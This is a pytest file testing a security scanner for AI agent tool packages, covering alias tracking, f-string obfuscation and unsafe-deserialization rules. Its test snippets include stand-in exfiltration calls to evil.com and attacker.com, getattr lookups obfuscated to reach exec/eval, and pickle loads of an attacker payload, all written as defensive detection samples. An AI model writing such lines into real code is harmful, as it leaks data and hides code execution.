"""
test_ast_enhancements.py
────────────────────────
Unit tests for three Layer 1 AST scanner enhancements:

  2a. Import alias tracking      — `import requests as r; r.get(...)` → EX-001
  2b. F-string obfuscation       — `f'ex{"ec"}'` resolves to "exec" → OBFUSC-002
  2c. Deserialization rules      — `pickle.loads(...)` → PE-009 (CRITICAL)

All tests are pure-Python (no Docker, no network).  Each test writes a snippet
to a temp file and feeds it through Layer1RuleEngine.evaluate() with a minimal
SkillManifest.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from scanner.layer1_static.rule_engine import Layer1RuleEngine
from scanner.models.skill_manifest import Framework, Permission, SkillManifest, ToolDefinition


# ─── Helpers ────────────────────────────────────────────────────────────────

def _engine():
    return Layer1RuleEngine()


def _manifest(*, declared_perms: list[Permission] | None = None) -> SkillManifest:
    """Minimal manifest with one tool and optional declared permissions."""
    tool = ToolDefinition(
        name="test_tool",
        description="A test tool.",
        declared_permissions=declared_perms or [],
    )
    return SkillManifest(framework=Framework.LANGCHAIN, tools=[tool])


def _rule_ids(report) -> set[str]:
    return {m.rule_id for m in report.matches}


def _scan_snippet(snippet: str, tmp_path: Path, **manifest_kwargs) -> set[str]:
    """Write *snippet* to a temp .py file, scan it, return the set of rule IDs fired."""
    f = tmp_path / "test_snippet.py"
    f.write_text(snippet, encoding="utf-8")
    manifest = _manifest(**manifest_kwargs)
    report = _engine().evaluate(manifest, source_files=[str(f)])
    return _rule_ids(report)


# ─── 2a: Import alias tracking ───────────────────────────────────────────────

class TestImportAliasTracking:
    def test_requests_aliased_get_triggers_ex001(self, tmp_path):
        """import requests as r; r.get(...) should fire EX-001."""
        snippet = (
            "import requests as r\n"
            'r.get("http://evil.com/steal")\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "EX-001" in fired, f"Expected EX-001 in {fired}"

    def test_requests_aliased_post_triggers_ex001(self, tmp_path):
        """import requests as r; r.post(...) should fire EX-001."""
        snippet = (
            "import requests as r\n"
            'r.post("http://evil.com/steal", data=secret)\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "EX-001" in fired

    def test_from_import_alias_triggers_ex001(self, tmp_path):
        """from requests import get as fetch; fetch(...) should fire EX-001."""
        snippet = (
            "from requests import get as fetch\n"
            'fetch("http://exfil.example.com/data")\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "EX-001" in fired

    def test_httpx_aliased_get_triggers_ex001(self, tmp_path):
        """import httpx as hx; hx.get(...) should fire EX-001."""
        snippet = (
            "import httpx as hx\n"
            'hx.get("https://attacker.com")\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "EX-001" in fired

    def test_aliased_requests_with_declared_permission_no_ex001(self, tmp_path):
        """When NETWORK_EGRESS is declared, alias tracking should NOT fire EX-001."""
        snippet = (
            "import requests as r\n"
            'r.get("https://api.example.com/data")\n'
        )
        fired = _scan_snippet(snippet, tmp_path, declared_perms=[Permission.NETWORK_EGRESS])
        assert "EX-001" not in fired

    def test_unrelated_alias_no_false_positive(self, tmp_path):
        """import math as m; m.sqrt(4) should NOT fire EX-001."""
        snippet = (
            "import math as m\n"
            "result = m.sqrt(4)\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "EX-001" not in fired

    def test_subprocess_aliased_triggers_pe003(self, tmp_path):
        """import subprocess as sp; sp.run([...]) should fire PE-003."""
        snippet = (
            "import subprocess as sp\n"
            'sp.run(["ls", "-la"])\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-003" in fired


# ─── 2b: F-string obfuscation detection ──────────────────────────────────────

class TestFStringObfuscation:
    def test_fstring_resolves_exec_triggers_obfusc002(self, tmp_path):
        """getattr(builtins, f'ex{"ec"}')() should resolve to exec → OBFUSC-002."""
        snippet = (
            "import builtins\n"
            "getattr(builtins, f'ex{\"ec\"}')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "OBFUSC-002" in fired, f"Expected OBFUSC-002 in {fired}"

    def test_fstring_getattr_resolves_eval_triggers_obfusc002(self, tmp_path):
        """getattr(obj, f'ev' + 'al') with f-string variant."""
        # Using JoinedStr with pure-constant formatted value
        snippet = (
            "import builtins\n"
            "fn = getattr(builtins, f'ev{\"al\"}')\n"
            "fn('1+1')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "OBFUSC-002" in fired

    def test_fully_constant_fstring_resolves(self, tmp_path):
        """getattr(obj, f'exec') — trivial f-string with no interpolation."""
        snippet = (
            "import builtins\n"
            "getattr(builtins, f'exec')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "OBFUSC-002" in fired

    def test_dynamic_fstring_not_resolved(self, tmp_path):
        """getattr(obj, f'ex{x}') where x is a variable — cannot statically resolve → no match."""
        snippet = (
            "import builtins\n"
            "x = 'ec'\n"
            "getattr(builtins, f'ex{x}')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        # Dynamic f-string — should NOT fire OBFUSC-002 (can't resolve statically)
        assert "OBFUSC-002" not in fired

    def test_fstring_benign_string_no_false_positive(self, tmp_path):
        """getattr(obj, f'hello') — benign, not a dangerous builtin → no match."""
        snippet = (
            "import builtins\n"
            "getattr(builtins, f'hello')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "OBFUSC-002" not in fired


# ─── 2c: Deserialization rules (PE-009) ──────────────────────────────────────

class TestDeserializationRules:
    def test_pickle_loads_triggers_pe009(self, tmp_path):
        """pickle.loads(data) should fire PE-009."""
        snippet = (
            "import pickle\n"
            'pickle.loads(open("data.pkl", "rb").read())\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired, f"Expected PE-009 in {fired}"

    def test_pickle_load_triggers_pe009(self, tmp_path):
        """pickle.load(f) should fire PE-009."""
        snippet = (
            "import pickle\n"
            'with open("data.pkl", "rb") as f:\n'
            "    obj = pickle.load(f)\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_marshal_loads_triggers_pe009(self, tmp_path):
        """marshal.loads(b) should fire PE-009."""
        snippet = (
            "import marshal\n"
            "marshal.loads(b'\\x00')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_marshal_load_triggers_pe009(self, tmp_path):
        """marshal.load(f) should fire PE-009."""
        snippet = (
            "import marshal\n"
            'with open("code.pyc", "rb") as f:\n'
            "    marshal.load(f)\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_shelve_open_triggers_pe009(self, tmp_path):
        """shelve.open() should fire PE-009."""
        snippet = (
            "import shelve\n"
            'db = shelve.open("store")\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_pickle_unpickler_triggers_pe009(self, tmp_path):
        """pickle.Unpickler(...) instantiation should fire PE-009."""
        snippet = (
            "import pickle\n"
            'u = pickle.Unpickler(open("data.pkl", "rb"))\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_cpickle_loads_triggers_pe009(self, tmp_path):
        """cPickle.loads() should fire PE-009."""
        snippet = (
            "import cPickle\n"
            "cPickle.loads(b'\\x80\\x04\\x95')\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_dill_loads_triggers_pe009(self, tmp_path):
        """dill.loads() (common pickle extension) should fire PE-009."""
        snippet = (
            "import dill\n"
            "dill.loads(payload)\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired

    def test_json_loads_no_pe009(self, tmp_path):
        """json.loads() is safe — must NOT fire PE-009."""
        snippet = (
            "import json\n"
            'data = json.loads(\'{"key": "value"}\')\n'
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" not in fired

    def test_pe009_severity_is_critical(self, tmp_path):
        """PE-009 matches should carry CRITICAL severity."""
        from scanner.models.skill_manifest import Severity

        f = tmp_path / "deser.py"
        f.write_text(
            "import pickle\n"
            "pickle.loads(data)\n",
            encoding="utf-8",
        )
        manifest = _manifest()
        report = _engine().evaluate(manifest, source_files=[str(f)])
        pe009_matches = [m for m in report.matches if m.rule_id == "PE-009"]
        assert pe009_matches, "PE-009 should have fired"
        for match in pe009_matches:
            assert match.severity == Severity.CRITICAL


# ─── Combined: alias + deserialization ───────────────────────────────────────

class TestAliasedDeserialization:
    def test_aliased_pickle_loads_triggers_pe009(self, tmp_path):
        """import pickle as pk; pk.loads(...) should fire PE-009 via alias resolution."""
        snippet = (
            "import pickle as pk\n"
            "pk.loads(attacker_payload)\n"
        )
        fired = _scan_snippet(snippet, tmp_path)
        assert "PE-009" in fired, f"Expected PE-009 (via alias) in {fired}"
